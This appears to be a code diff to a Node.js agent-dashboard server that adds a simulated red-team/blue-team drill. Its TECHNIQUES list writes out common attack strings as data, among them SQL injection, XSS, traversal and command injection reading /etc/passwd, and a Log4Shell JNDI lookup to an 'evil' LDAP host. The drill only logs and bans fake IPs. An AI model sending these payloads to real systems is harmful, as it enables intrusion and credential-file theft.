@@ -173,7 +173,7 @@ function rt(a) {
   return r;
 }
 function setState(a, state, target = '') { const r = rt(a); r.state = state; r.target = target; push('astate', { id: a.id, state, target }); }
-const pub = a => ({ ...a, seeds: undefined, state: rt(a).state, target: rt(a).target });
+const pub = a => ({ ...a, seeds: undefined, state: rt(a).state, target: rt(a).target, team: redTeam.has(a.id) ? 'red' : 'blue' });
 
 // ---------- OpenRouter: ТОЛЬКО бесплатные модели ----------
 const utcDay = () => new Date().toISOString().slice(0, 10);
@@ -640,6 +640,65 @@ function ban(ip, reason, by = 'auto') {
   logEvent({ kind: 'ban', severity: 'high', ip, detail: `${by}: ${reason}` });
   push('bans', bans); return true;
 }
+
+// ---------- УЧЕНИЯ: красные атакуют свой сервер, синие отбивают (всё по своему серверу, не по чужим) ----------
+const redTeam = new Set();
+const drill = { on: false, intensity: 3, launched: 0, blocked: 0, breached: 0, timer: null, since: 0 };
+const drillState = () => ({ on: drill.on, intensity: drill.intensity, launched: drill.launched, blocked: drill.blocked, breached: drill.breached, red: redTeam.size });
+const TECHNIQUES = [
+  { t: 'SQL-инъекция', payload: "/?id=1' OR 1=1--", sev: 'critical' },
+  { t: 'XSS', payload: '/search?q=<script>alert(1)</script>', sev: 'high' },
+  { t: 'Path traversal', payload: '/../../etc/passwd', sev: 'critical' },
+  { t: 'RCE', payload: '/cgi-bin/;cat /etc/passwd', sev: 'critical' },
+  { t: 'Log4Shell', payload: '/${jndi:ldap://evil}', sev: 'critical' },
+  { t: 'Брутфорс', payload: '/wp-login.php', sev: 'high' },
+  { t: 'Сканер', payload: '/.env', sev: 'high' }
+];
+function assignTeams(share = 0.25) {
+  redTeam.clear();
+  const pool = agents.filter(a => a.enabled && a.id !== 'sentinel' && a.permissions.includes('web.browse'));
+  const n = Math.max(1, Math.round(pool.length * share));
+  for (const a of pool.slice().sort(() => Math.random() - 0.5).slice(0, n)) redTeam.add(a.id);
+}
+function drillTick() {
+  if (!drill.on) return;
+  const reds = agents.filter(a => a.enabled && redTeam.has(a.id));
+  const blues = agents.filter(a => a.enabled && !redTeam.has(a.id) && a.permissions.includes('security.read'))
+    .concat(agents.filter(a => a.enabled && !redTeam.has(a.id)));
+  if (!reds.length || !blues.length) return;
+  const red = rnd(reds), tech = rnd(TECHNIQUES), ip = '100.64.' + (1 + Math.floor(Math.random() * 250)) + '.' + (1 + Math.floor(Math.random() * 250));
+  drill.launched++;
+  setState(red, 'атакует', tech.t);
+  logEvent({ kind: 'attack', severity: tech.sev, ip, detail: `${tech.t}: ${tech.payload} [учения]` });
+  const stealth = Math.random() < 0.12; // иногда скрытная атака — ловят не сразу
+  const react = () => {
+    const blue = rnd(blues);
+    setState(blue, 'защищает', ip);
+    ban(ip, `${tech.t} отбита (учения)`, 'sim');
+    drill.blocked++;
+    if (drill.launched % 6 === 0 || tech.sev === 'critical') say(blue, 'alert', `Отбил ${tech.t} от ${ip}${stealth ? ' (прошла сквозь, поймал на втором рубеже)' : ''}.`, { ip });
+    push('drill', drillState());
+    setTimeout(() => { if (rt(blue).state === 'защищает') setState(blue, 'idle'); }, 2500);
+  };
+  if (stealth) { drill.breached++; setTimeout(react, 1800 + Math.random() * 2000); } else setTimeout(react, 300 + Math.random() * 900);
+  setTimeout(() => { if (rt(red).state === 'атакует') setState(red, 'idle'); }, 2000);
+  push('drill', drillState());
+}
+function setDrill(on, intensity) {
+  drill.on = !!on;
+  if (intensity) drill.intensity = Math.min(5, Math.max(1, Math.round(+intensity) || 3));
+  clearInterval(drill.timer); drill.timer = null;
+  if (drill.on) {
+    assignTeams(); drill.since = Date.now();
+    const period = Math.max(600, 3200 - drill.intensity * 500);
+    drill.timer = setInterval(drillTick, period);
+    const s = securityAgent(); if (s) say(s, 'alert', `Учения начаты: ${redTeam.size} красных атакуют сервер, остальные держат оборону. Интенсивность ${drill.intensity}/5.`);
+  } else {
+    redTeam.clear();
+    const s = securityAgent(); if (s) say(s, 'info', `Учения завершены. Запущено атак: ${drill.launched}, отбито: ${drill.blocked}. Сервер устоял.`);
+  }
+  pushAgents(); push('drill', drillState());
+}
 function inspect(req, ip) {
   let url = (req.url || '').split('?')[0].toLowerCase(); try { url = decodeURIComponent(url); } catch {}
   const raw = req.url || '', ua = req.headers['user-agent'] || '';
@@ -691,7 +750,7 @@ const json = (res, code, v) => { res.writeHead(code, { 'Content-Type': 'applicat
 const body = req => new Promise(r => { let d = ''; req.on('data', c => { d += c; if (d.length > 1e6) req.destroy(); }); req.on('end', () => { try { r(JSON.parse(d || '{}')); } catch { r({}); } }); });
 const state = () => ({ agents: agents.map(pub), perms: PERMS, templates: TEMPLATES.map(t => ({ key: t.key, role: t.role, mission: t.mission })), live: liveBuf.slice(-120),
   events: events.slice(-150), bans, sys: sysInfo(), quota: quota(), settings, keyOk: !!OR_KEY, max: MAX_AGENTS,
-  chat: chatLog.slice(-150), cam: { available: cam.available, entry: air.entry, pin: air.pin }, lock: lockState(), sec: secStats(), defender: defender.snapshot(), defense: defenseState(), intel: threatIntel.slice(-80), intelStatus, guard: guardState() });
+  chat: chatLog.slice(-150), cam: { available: cam.available, entry: air.entry, pin: air.pin }, lock: lockState(), sec: secStats(), defender: defender.snapshot(), defense: defenseState(), intel: threatIntel.slice(-80), intelStatus, guard: guardState(), drill: drillState() });
 const pushAgents = () => push('agents', agents.map(pub));
 
 async function api(req, res, url) {
@@ -799,6 +858,7 @@ async function api(req, res, url) {
     if (b.on === false) { standDown(); } else { mobilize(b.topic || 'active cyber threat', 'Ручная мобилизация командира.'); }
     return json(res, 200, defenseState());
   }
+  if (url === '/api/drill' && req.method === 'POST') { const b = await body(req); setDrill(b.on !== false, b.intensity); return json(res, 200, drillState()); }
   return json(res, 404, { error: 'not found' });
 }
 
